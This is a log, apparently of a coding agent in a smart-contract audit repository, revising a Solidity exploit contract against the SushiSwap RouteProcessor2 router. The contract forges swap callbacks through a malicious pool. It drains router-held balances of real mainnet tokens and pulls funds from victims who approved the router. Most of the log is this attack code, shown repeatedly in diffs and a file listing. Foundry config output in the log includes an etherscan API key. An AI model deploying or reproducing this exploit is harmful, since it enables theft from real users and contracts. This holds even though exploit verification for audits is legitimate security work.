++            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
++        }
++    }
++
++    function _sweepToBeneficiary() internal {
+         uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+         if (stolen > 0) {
+             _safeTransfer(forgedToken, beneficiary, stolen);
+         }
+-
+-        return (_toInt(amountToPull), -_toInt(stolen));
+     }
+ 
+     function _safeTransfer(address token, address to, uint256 amount) internal {
+@@ -74,43 +111,51 @@
+         require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+     }
+ 
+-    function _toUint(int256 value) internal pure returns (uint256) {
+-        require(value >= 0, "negative cast");
+-        return uint256(value);
+-    }
+-
+-    function _toInt(uint256 value) internal pure returns (int256) {
+-        require(value <= uint256(type(int256).max), "int overflow");
+-        return int256(value);
++    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
++        require(amountSpecified > 0, "non-positive amount");
++        return uint256(amountSpecified);
+     }
+ }
+ 
+ contract FlawVerifier {
+     address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+ 
++    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
++    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
++    uint8 internal constant POOL_UNIV3 = 1;
++    uint8 internal constant POOL_TRIDENT_CL = 5;
++
+     address internal immutable POOL;
+ 
+-    address internal _profitToken;
+-    uint256 internal _profitAmount;
++    address internal storedProfitToken;
++    uint256 internal storedProfitAmount;
+ 
+     address public configuredVictim;
+     address public configuredVictimToken;
+ 
+     constructor() {
+-        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
++        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+     }
+ 
+     function executeOnOpportunity() external {
+-        if (_profitAmount > 0) {
++        if (storedProfitAmount != 0) {
+             return;
+         }
+ 
+-        if (_drainRouterBalances()) {
++        if (_drainRouterBalances(false)) {
++            return;
++        }
++
++        if (_drainRouterBalances(true)) {
+             return;
+         }
+ 
+         if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+-            _attemptVictimDrain(configuredVictim, configuredVictimToken);
++            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
++                return;
++            }
++
++            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+         }
+     }
+ 
+@@ -120,31 +165,31 @@
+     }
+ 
+     function profitToken() external view returns (address) {
+-        return _profitToken;
++        return storedProfitToken;
+     }
+ 
+     function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
++        return storedProfitAmount;
+     }
+ 
+-    function _drainRouterBalances() internal returns (bool) {
++    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+         address[16] memory candidates = [
+-            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+-            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+-            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+-            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+-            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
+-            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+-            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+-            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+-            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+-            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+-            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+-            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+-            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+-            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+-            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+-            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
++            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
++            0xdAC17F958D2ee523a2206206994597C13D831ec7,
++            0x6B175474E89094C44Da98b954EedeAC495271d0F,
++            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
++            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
++            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
++            0x514910771AF9Ca656af840dff83E8264EcF986CA,
++            0xD533a949740bb3306d119CC777fa900bA034cd52,
++            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
++            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
++            0x853d955aCEf822Db058eb8505911ED77F175b99e,
++            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
++            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
++            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
++            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
++            0x111111111117dC0aa78b770fA6A738034120C302
+         ];
+ 
+         for (uint256 i = 0; i < candidates.length; ++i) {
+@@ -153,7 +198,7 @@
+                 continue;
+             }
+ 
+-            if (_attemptRouterDrain(candidates[i])) {
++            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+                 return true;
+             }
+         }
+@@ -161,74 +206,71 @@
+         return false;
+     }
+ 
+-    function _attemptRouterDrain(address token) internal returns (bool) {
++    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildRoute(token);
++        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
+     }
+ 
+-    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
++    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+         uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+         uint256 balance = IERC20(token).balanceOf(victim);
+         uint256 amountToPull = allowance < balance ? allowance : balance;
+-
+-        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+-        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+-        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+         if (amountToPull == 0) {
+             return false;
+         }
+ 
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, victim, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildForgedUserRoute(token);
++        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
++    }
++
++    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
++        uint256 afterBalance = IERC20(token).balanceOf(address(this));
++        if (afterBalance > beforeBalance) {
++            storedProfitToken = token;
++            storedProfitAmount = afterBalance - beforeBalance;
++            return true;
++        }
+ 
+         return false;
+     }
+ 
+-    function _buildRoute(address token) internal view returns (bytes memory) {
++    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(1)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_MY_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ 
+-    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
++    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(2)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_USER_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ }
+
+codex
+Local Foundry can’t build because this environment doesn’t have a `0.8.20+` compiler installed. I’m checking the repo config now to make sure there isn’t a local version pin I should match or work around.
+exec
+/bin/bash -lc 'cat foundry.toml' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+[profile.default]
+src = "src"
+test = "test"
+libs = []
+solc_version = "0.8.10"
+evm_version = "paris"
+optimizer = true
+optimizer_runs = 200
+
+exec
+/bin/bash -lc 'forge config' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+[profile.default]
+src = "src"
+test = "test"
+script = "script"
+out = "out"
+libs = []
+remappings = []
+auto_detect_remappings = true
+libraries = []
+cache = true
+dynamic_test_linking = false
+cache_path = "cache"
+snapshots = "snapshots"
+gas_snapshot_check = false
+gas_snapshot_emit = true
+broadcast = "broadcast"
+allow_paths = []
+include_paths = []
+skip = []
+force = false
+evm_version = "london"
+gas_reports = ["*"]
+gas_reports_ignore = []
+gas_reports_include_tests = false
+solc = "0.8.10"
+auto_detect_solc = true
+offline = false
+optimizer = true
+optimizer_runs = 200
+verbosity = 0
+eth_rpc_accept_invalid_certs = false
+etherscan_api_key = "ZFNNGRNEUNGRH3XHGE5A61Q3MVGIEVF31K"
+ignored_error_codes = [
+    "license",
+    "code-size",
+    "init-code-size",
+    "transient-storage",
+]
+ignored_warnings_from = []
+deny = "never"
+test_failures_file = "cache/test-failures"
+show_progress = false
+ffi = false
+allow_internal_expect_revert = false
+always_use_create_2_factory = false
+prompt_timeout = 120
+sender = "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38"
+tx_origin = "0x1804c8ab1f12e6bbf3894d4083f33e07309d1f38"
+initial_balance = "0xffffffffffffffffffffffff"
+block_number = 1
+gas_limit = 1073741824
+block_base_fee_per_gas = 0
+block_coinbase = "0x0000000000000000000000000000000000000000"
+block_timestamp = 1
+block_difficulty = 0
+block_prevrandao = "0x0000000000000000000000000000000000000000000000000000000000000000"
+memory_limit = 134217728
+extra_output = []
+extra_output_files = []
+names = false
+sizes = false
+via_ir = false
+ast = false
+no_storage_caching = false
+no_rpc_rate_limit = false
+use_literal_content = false
+bytecode_hash = "ipfs"
+cbor_metadata = true
+sparse_mode = false
+build_info = false
+isolate = false
+disable_block_gas_limit = false
+enable_tx_gas_limit = false
+unchecked_cheatcode_artifacts = false
+create2_library_salt = "0x0000000000000000000000000000000000000000000000000000000000000000"
+create2_deployer = "0x4e59b44847b379578588920ca78fbf26c0b4956c"
+assertions_revert = true
+legacy_assertions = false
+celo = false
+bypass_prevrandao = false
+transaction_timeout = 120
+additional_compiler_profiles = []
+compilation_restrictions = []
+script_execution_protection = true
+
+[profile.default.rpc_storage_caching]
+chains = "all"
+endpoints = "all"
+
+[[profile.default.fs_permissions]]
+access = "read"
+path = "out"
+
+[fmt]
+line_length = 120
+tab_width = 4
+style = "space"
+bracket_spacing = false
+int_types = "long"
+multiline_func_header = "attributes_first"
+quote_style = "double"
+number_underscore = "preserve"
+hex_underscore = "remove"
+single_line_statement_blocks = "preserve"
+override_spacing = false
+wrap_comments = false
+docs_style = "preserve"
+ignore = []
+contract_new_lines = false
+sort_imports = false
+pow_no_space = false
+prefer_compact = "all"
+single_line_imports = false
+
+[lint]
+severity = []
+exclude_lints = []
+ignore = []
+lint_on_build = true
+mixed_case_exceptions = [
+    "ERC",
+    "URI",
+]
+
+[doc]
+out = "docs"
+title = ""
+book = "book.toml"
+homepage = "README.md"
+ignore = []
+
+[fuzz]
+runs = 256
+fail_on_revert = true
+max_test_rejects = 65536
+dictionary_weight = 40
+include_storage = true
+include_push_bytes = true
+max_fuzz_dictionary_addresses = 15728640
+max_fuzz_dictionary_values = 9830400
+max_fuzz_dictionary_literals = 6553600
+gas_report_samples = 256
+corpus_gzip = true
+corpus_min_mutations = 5
+corpus_min_size = 0
+show_edge_coverage = false
+failure_persist_dir = "cache/fuzz"
+show_logs = false
+
+[invariant]
+runs = 256
+depth = 500
+fail_on_revert = false
+call_override = false
+dictionary_weight = 80
+include_storage = true
+include_push_bytes = true
+max_fuzz_dictionary_addresses = 15728640
+max_fuzz_dictionary_values = 9830400
+max_fuzz_dictionary_literals = 6553600
+shrink_run_limit = 5000
+max_assume_rejects = 65536
+gas_report_samples = 256
+corpus_gzip = true
+corpus_min_mutations = 5
+corpus_min_size = 0
+show_edge_coverage = false
+failure_persist_dir = "cache/invariant"
+show_metrics = true
+show_solidity = false
+
+[labels]
+
+[vyper]
+
+[bind_json]
+out = "utils/JsonBindings.sol"
+include = []
+exclude = []
+
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 8668bc7521a5de0a61b6ef386e66d65746738fd5..cd628359e509b828310a1b782143f09fda18aad5
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: UNLICENSED
+-pragma solidity 0.8.10;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20 {
+     function balanceOf(address account) external view returns (uint256);
+@@ -22,26 +22,50 @@
+         int256 amount1Delta,
+         bytes calldata data
+     ) external;
++
++    function tridentCLSwapCallback(
++        int256 amount0Delta,
++        int256 amount1Delta,
++        bytes calldata data
++    ) external;
+ }
+ 
+-contract MaliciousV3Pool {
++contract MaliciousConcentratedLiquidityPool {
+     address internal immutable VERIFIER;
+     address internal immutable TARGET_ROUTER;
+ 
+     address internal forgedToken;
+     address internal forgedFrom;
+     address internal beneficiary;
++    bool internal useTridentCallback;
+ 
+     constructor(address verifier_, address router_) {
+         VERIFIER = verifier_;
+         TARGET_ROUTER = router_;
+     }
+ 
+-    function configure(address token_, address from_, address beneficiary_) external {
++    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+         require(msg.sender == VERIFIER, "not verifier");
+         forgedToken = token_;
+         forgedFrom = from_;
+         beneficiary = beneficiary_;
++        useTridentCallback = useTrident_;
++    }
++
++    function swap(
++        address,
++        bool,
++        int256 amountSpecified,
++        uint160,
++        bytes calldata
++    ) external returns (int256 amount0, int256 amount1) {
++        require(msg.sender == TARGET_ROUTER, "not router");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
+     }
+ 
+     function swap(
+@@ -49,24 +73,37 @@
+         bool,
+         int256 amountSpecified,
+         uint160,
++        bool,
+         bytes calldata
+     ) external returns (int256 amount0, int256 amount1) {
+         require(msg.sender == TARGET_ROUTER, "not router");
+-        require(amountSpecified >= 0, "negative amount");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
++    }
+ 
+-        uint256 amountToPull = _toUint(amountSpecified);
+-        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+-            _toInt(amountToPull),
+-            int256(0),
+-            abi.encode(forgedToken, forgedFrom)
+-        );
++    function _invokeForgedCallback(uint256 amountToPull) internal {
++        // The real router stores the arbitrary pool in lastCalledPool and later only checks
++        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
++        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
++        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
++        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+ 
++        if (useTridentCallback) {
++            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
++        } else {
++            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
++        }
++    }
++
++    function _sweepToBeneficiary() internal {
+         uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+         if (stolen > 0) {
+             _safeTransfer(forgedToken, beneficiary, stolen);
+         }
+-
+-        return (_toInt(amountToPull), -_toInt(stolen));
+     }
+ 
+     function _safeTransfer(address token, address to, uint256 amount) internal {
+@@ -74,43 +111,51 @@
+         require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+     }
+ 
+-    function _toUint(int256 value) internal pure returns (uint256) {
+-        require(value >= 0, "negative cast");
+-        return uint256(value);
+-    }
+-
+-    function _toInt(uint256 value) internal pure returns (int256) {
+-        require(value <= uint256(type(int256).max), "int overflow");
+-        return int256(value);
++    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
++        require(amountSpecified > 0, "non-positive amount");
++        return uint256(amountSpecified);
+     }
+ }
+ 
+ contract FlawVerifier {
+     address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+ 
++    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
++    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
++    uint8 internal constant POOL_UNIV3 = 1;
++    uint8 internal constant POOL_TRIDENT_CL = 5;
++
+     address internal immutable POOL;
+ 
+-    address internal _profitToken;
+-    uint256 internal _profitAmount;
++    address internal storedProfitToken;
++    uint256 internal storedProfitAmount;
+ 
+     address public configuredVictim;
+     address public configuredVictimToken;
+ 
+     constructor() {
+-        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
++        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+     }
+ 
+     function executeOnOpportunity() external {
+-        if (_profitAmount > 0) {
++        if (storedProfitAmount != 0) {
+             return;
+         }
+ 
+-        if (_drainRouterBalances()) {
++        if (_drainRouterBalances(false)) {
++            return;
++        }
++
++        if (_drainRouterBalances(true)) {
+             return;
+         }
+ 
+         if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+-            _attemptVictimDrain(configuredVictim, configuredVictimToken);
++            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
++                return;
++            }
++
++            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+         }
+     }
+ 
+@@ -120,31 +165,31 @@
+     }
+ 
+     function profitToken() external view returns (address) {
+-        return _profitToken;
++        return storedProfitToken;
+     }
+ 
+     function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
++        return storedProfitAmount;
+     }
+ 
+-    function _drainRouterBalances() internal returns (bool) {
++    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+         address[16] memory candidates = [
+-            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+-            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+-            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+-            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+-            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
+-            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+-            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+-            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+-            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+-            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+-            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+-            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+-            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+-            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+-            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+-            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
++            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
++            0xdAC17F958D2ee523a2206206994597C13D831ec7,
++            0x6B175474E89094C44Da98b954EedeAC495271d0F,
++            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
++            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
++            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
++            0x514910771AF9Ca656af840dff83E8264EcF986CA,
++            0xD533a949740bb3306d119CC777fa900bA034cd52,
++            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
++            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
++            0x853d955aCEf822Db058eb8505911ED77F175b99e,
++            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
++            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
++            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
++            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
++            0x111111111117dC0aa78b770fA6A738034120C302
+         ];
+ 
+         for (uint256 i = 0; i < candidates.length; ++i) {
+@@ -153,7 +198,7 @@
+                 continue;
+             }
+ 
+-            if (_attemptRouterDrain(candidates[i])) {
++            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+                 return true;
+             }
+         }
+@@ -161,74 +206,71 @@
+         return false;
+     }
+ 
+-    function _attemptRouterDrain(address token) internal returns (bool) {
++    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildRoute(token);
++        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
+     }
+ 
+-    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
++    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+         uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+         uint256 balance = IERC20(token).balanceOf(victim);
+         uint256 amountToPull = allowance < balance ? allowance : balance;
+-
+-        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+-        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+-        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+         if (amountToPull == 0) {
+             return false;
+         }
+ 
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, victim, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildForgedUserRoute(token);
++        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
++    }
++
++    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
++        uint256 afterBalance = IERC20(token).balanceOf(address(this));
++        if (afterBalance > beforeBalance) {
++            storedProfitToken = token;
++            storedProfitAmount = afterBalance - beforeBalance;
++            return true;
++        }
+ 
+         return false;
+     }
+ 
+-    function _buildRoute(address token) internal view returns (bytes memory) {
++    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(1)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_MY_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ 
+-    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
++    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(2)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_USER_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ }
+
+codex
+The only local blocker now is tooling: repo config is pinned to `0.8.10`, so this sandbox can’t compile a `^0.8.20` file without fetching another compiler. I’m doing a quick syntax pass and then I’ll return the final source as requested.
+exec
+/bin/bash -lc 'solc --version' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ exited 127 in 0ms:
+/bin/bash: solc: command not found
+
+exec
+/bin/bash -lc "nl -ba src/FlawVerifier.sol | sed -n '1,260p'" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+     1	// SPDX-License-Identifier: UNLICENSED
+     2	pragma solidity ^0.8.20;
+     3	
+     4	interface IERC20 {
+     5	    function balanceOf(address account) external view returns (uint256);
+     6	    function allowance(address owner, address spender) external view returns (uint256);
+     7	    function transfer(address to, uint256 amount) external returns (bool);
+     8	}
+     9	
+    10	interface IRouteProcessor2 {
+    11	    function processRoute(
+    12	        address tokenIn,
+    13	        uint256 amountIn,
+    14	        address tokenOut,
+    15	        uint256 amountOutMin,
+    16	        address to,
+    17	        bytes calldata route
+    18	    ) external payable returns (uint256 amountOut);
+    19	
+    20	    function uniswapV3SwapCallback(
+    21	        int256 amount0Delta,
+    22	        int256 amount1Delta,
+    23	        bytes calldata data
+    24	    ) external;
+    25	
+    26	    function tridentCLSwapCallback(
+    27	        int256 amount0Delta,
+    28	        int256 amount1Delta,
+    29	        bytes calldata data
+    30	    ) external;
+    31	}
+    32	
+    33	contract MaliciousConcentratedLiquidityPool {
+    34	    address internal immutable VERIFIER;
+    35	    address internal immutable TARGET_ROUTER;
+    36	
+    37	    address internal forgedToken;
+    38	    address internal forgedFrom;
+    39	    address internal beneficiary;
+    40	    bool internal useTridentCallback;
+    41	
+    42	    constructor(address verifier_, address router_) {
+    43	        VERIFIER = verifier_;
+    44	        TARGET_ROUTER = router_;
+    45	    }
+    46	
+    47	    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+    48	        require(msg.sender == VERIFIER, "not verifier");
+    49	        forgedToken = token_;
+    50	        forgedFrom = from_;
+    51	        beneficiary = beneficiary_;
+    52	        useTridentCallback = useTrident_;
+    53	    }
+    54	
+    55	    function swap(
+    56	        address,
+    57	        bool,
+    58	        int256 amountSpecified,
+    59	        uint160,
+    60	        bytes calldata
+    61	    ) external returns (int256 amount0, int256 amount1) {
+    62	        require(msg.sender == TARGET_ROUTER, "not router");
+    63	        uint256 amountToPull = _positiveAmount(amountSpecified);
+    64	        _invokeForgedCallback(amountToPull);
+    65	        _sweepToBeneficiary();
+    66	
+    67	        amount0 = int256(amountToPull);
+    68	        amount1 = -int256(amountToPull);
+    69	    }
+    70	
+    71	    function swap(
+    72	        address,
+    73	        bool,
+    74	        int256 amountSpecified,
+    75	        uint160,
+    76	        bool,
+    77	        bytes calldata
+    78	    ) external returns (int256 amount0, int256 amount1) {
+    79	        require(msg.sender == TARGET_ROUTER, "not router");
+    80	        uint256 amountToPull = _positiveAmount(amountSpecified);
+    81	        _invokeForgedCallback(amountToPull);
+    82	        _sweepToBeneficiary();
+    83	
+    84	        amount0 = int256(amountToPull);
+    85	        amount1 = -int256(amountToPull);
+    86	    }
+    87	
+    88	    function _invokeForgedCallback(uint256 amountToPull) internal {
+    89	        // The real router stores the arbitrary pool in lastCalledPool and later only checks
+    90	        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
+    91	        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
+    92	        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
+    93	        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+    94	
+    95	        if (useTridentCallback) {
+    96	            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
+    97	        } else {
